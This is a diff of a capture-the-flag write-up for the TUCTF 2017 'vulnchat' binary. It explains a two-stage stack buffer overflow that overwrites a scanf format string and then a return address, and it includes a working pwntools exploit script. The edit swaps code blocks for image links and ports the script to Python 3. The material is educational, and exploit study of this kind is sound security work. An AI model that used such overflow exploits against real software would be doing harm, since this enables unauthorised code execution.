@@ -1,93 +1,29 @@
 # tuctf 2017 vulnchat
 
+This was done on `Ubuntu 20.04.4`, although the exact ubuntu version probably doesn't matter too much for this one.
+
 Let's take a look at the binary:
 
-```
-$    file vuln-chat
-vuln-chat: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-, for GNU/Linux 2.6.32, BuildID[sha1]=a3caa1805eeeee1454ee76287be398b12b5fa2b7, not stripped
-$    ./vuln-chat
------------ Welcome to vuln-chat -------------
-Enter your username: 15935728
-Welcome 15935728!
-Connecting to 'djinn'
---- 'djinn' has joined your chat ---
-djinn: I have the information. But how do I know I can trust you?
-15935728: you don't
-djinn: Sorry. That's not good enough
-```
+![intro_data](pics/intro_data.png)
+
 
 So we can see that we are dealing with a 32 bit elf binary. When we run it, it prompts us for two seperate inputs. The first is a username, and the second is a string that is supposed to make it trust us. Taking a look at the main function in Ghidra we see this:
 
-```
-undefined4 main(void)
+![main](pics/main.png)
 
-{
-  undefined password [20];
-  undefined name [20];
-  undefined4 fmt;
-  undefined local_5;
- 
-  setvbuf(stdout,(char *)0x0,2,0x14);
-  puts("----------- Welcome to vuln-chat -------------");
-  printf("Enter your username: ");
-  fmt = 0x73303325;
-  local_5 = 0;
-  __isoc99_scanf(&fmt,name);
-  printf("Welcome %s!\n",name);
-  puts("Connecting to \'djinn\'");
-  sleep(1);
-  puts("--- \'djinn\' has joined your chat ---");
-  puts("djinn: I have the information. But how do I know I can trust you?");
-  printf("%s: ",name);
-  __isoc99_scanf(&fmt,password);
-  puts("djinn: Sorry. That\'s not good enough");
-  fflush(stdout);
-  return 0;
-}
-```
+So we can see, the program essentially calls `scanf` twice. The input is first scanned into `name`, then into `password`. The format specifier is stored on the stack in the `fmtString` variable. We can see in the assembly code that it is initialized to `%30s` (it comes up as `s03%` because it's least endian) (we have to convert the data to a char sequence):
 
-So we can see, the program essentially calls `scanf` twice. The input is first scanned into `name`, then into `password`. The format specifier is stored on the stack in the `fmt` variable. We can see in the assembly code that it is initialized to `%30s` (we have to convert the data to a char sequence):
-
-```
-        080485be c7 45 fb        MOV        dword ptr [EBP + fmt],"%30s"
-                 25 33 30 73
-```
+![fmt_str](pics/fmt_str.png)
 
 So both times by default it will let us scan in 30 characters, which will let us scan in 30 bytes worth of data. Next we take a look at the stack layout in Ghidra:
 
-```
-                             **************************************************************
-                             *                          FUNCTION                          *
-                             **************************************************************
-                             undefined main()
-             undefined         AL:1           <RETURN>
-             undefined1        Stack[-0x5]:1  local_5                                 XREF[1]:     080485c5(W)  
-             undefined4        Stack[-0x9]:4  fmt                                     XREF[3]:     080485be(W),
-                                                                                                   080485cd(*),
-                                                                                                   08048630(*)  
-             undefined[20]     Stack[-0x1d]   name                                    XREF[3]:     080485c9(*),
-                                                                                                   080485d9(*),
-                                                                                                   0804861b(*)  
-             undefined[20]     Stack[-0x31]   password                                XREF[1]:     0804862c(*)  
-                             main                                            XREF[4]:     Entry Point(*),
-                                                                                          _start:08048487(*), 08048830,
-                                                                                          080488ac(*)  
-        0804858a 55              PUSH       EBP
-```
+![stack_layout](pics/stack_layout.png)
 
-So we can see that `password` is stored at offset `-0x31`, `name` is stored at offset `-0x1d`, and `fmt` is stored at `-0x9`. The `password` char array can hold `0x31 - 0x1d = 0x14` bytes. The `name` char array can hold `0x1d - 0x9 = 0x14` bytes worth of data too. Since we can scan in `30` bytes worth of data, this gives us a 10 byte overflow in both cases. With our given setup we won't be able to get code execution with either overflow alone. However with the first overflow (the one to `name`) we will be able to overwrite the value of `fmt`. This will allow us to specify how much data the second `scanf` call will scan. With that we will be able to scan in more than enough data to overwrite the saved return address, and get code execution when the `ret` instruction executes.
+So we can see that `password` is stored at offset `-0x31`, `name` is stored at offset `-0x1d`, and `fmtString` is stored at `-0x9`. The `password` char array can hold `0x31 - 0x1d = 0x14` bytes. The `name` char array can hold `0x1d - 0x9 = 0x14` bytes worth of data too. Since we can scan in `30` bytes worth of data, this gives us a 10 byte overflow in both cases. With our given setup we won't be able to get code execution with either overflow alone. However with the first overflow (the one to `name`) we will be able to overwrite the value of `fmtString`. This will allow us to specify how much data the second `scanf` call will scan. With that we will be able to scan in more than enough data to overwrite the saved return address, and get code execution when the `ret` instruction executes. The saved return address is an instruction ptr, of the next instruction after the one that called the current function, so after the current function ends, it can return to the original function.
 
 For what function to call, the `printFlag` function at `0x804856b` seems to be a good candidate. It just prints the context of the flag using `cat` (also to get the flag, we need to have a copy of `flag.txt` in the same directory as the binary):
 
-```
-void printFlag(void)
-
-{
-  system("/bin/cat ./flag.txt");
-  puts("Use it wisely");
-  return;
-}
-```
+![print_flag](pics/print_flag.png)
 
 So let's take a look at how the memory is corrupted during the exploit. First I set a breakpoint for right after the second scanf call:
 
@@ -172,6 +108,8 @@ Stack level 0, frame at 0xffffd070:
 
 So we can see that the format string is stored at `0xffffd063`, which is `20` bytes away from our name at `0xffffd04f`. Our second input begins at `0xffffd03b` which is `0x31` bytes away from the return address at `0xffffd06c`. Also one thing, the memory layout here probably looks a bit weird. The reason for this is `x86` is designed around `4` byte values (although it can handle a lot of different sizes for value types), so most addresses (with the except of variable length ones) are aligned to either `0x0`, `0x4`, `0x8`, or `0xc`. However our char array (which can be a wide array of values) starts at `0xffffd03b`, so it messes up the alignment when we view the memory using it as a reference.
 
+Also, we can figure out the offsets via looking at the ghidra offsets. We see `name` is at offset `-0x1d`, and `fmtString` is at offset `-0x9`. So with the input that starts at `name` after `0x14` (`0x1d - 0x9 = 0x14`) bytes, we'll reach `fmtString`. Also `password` is stored at offset `-0x31`, and since ghdira puts the stack offsets from the saved return address, it is `0x31` bytes away (I have seen this be wrong in some instances).
+
 Putting it all together, we get the following exploit:
 ```
 from pwn import *
@@ -180,22 +118,22 @@ from pwn import *
 target = process('./vuln-chat')
 
 # Print the initial text
-print target.recvuntil("username: ")
+print(target.recvuntil(b"username: "))
 
 # Form the first payload to overwrite the scanf format string
-payload0 = ""
-payload0 += "0"*0x14 # Fill up space to format string
-payload0 += "%99s" # Overwrite it with "%99s"
+payload0 = b""
+payload0 += b"0"*0x14 # Fill up space to format string
+payload0 += b"%99s" # Overwrite it with "%99s"
 
 # Send the payload with a newline character
 target.sendline(payload0)
 
 # Print the text up to the second scanf call
-print target.recvuntil("I know I can trust you?")
+print(target.recvuntil(b"I know I can trust you?"))
 
 # From the second payload to overwrite the return address
-payload1 = ""
-payload1 += "1"*0x31 # Filler space to return address
+payload1 = b""
+payload1 += b"1"*0x31 # Filler space to return address
 payload1 += p32(0x804856b) # Address of the print_flag function
 
 # Send the second payload with a newline character
@@ -207,22 +145,6 @@ target.interactive()
 
 When we run it:
 
-```
-$    python exploit.py
-[+] Starting local process './vuln-chat': pid 9724
------------ Welcome to vuln-chat -------------
-Enter your username:
-Welcome 00000000000000000000%99s!
-Connecting to 'djinn'
---- 'djinn' has joined your chat ---
-djinn: I have the information. But how do I know I can trust you?
-[*] Switching to interactive mode
-
-00000000000000000000%99s: djinn: Sorry. That's not good enough
-flag{g0ttem_b0yz}
-Use it wisely
-[*] Got EOF while reading in interactive
-$  
-```
+![exploit_running](pics/exploit_running.png)
 
 Just like that we got a shell!
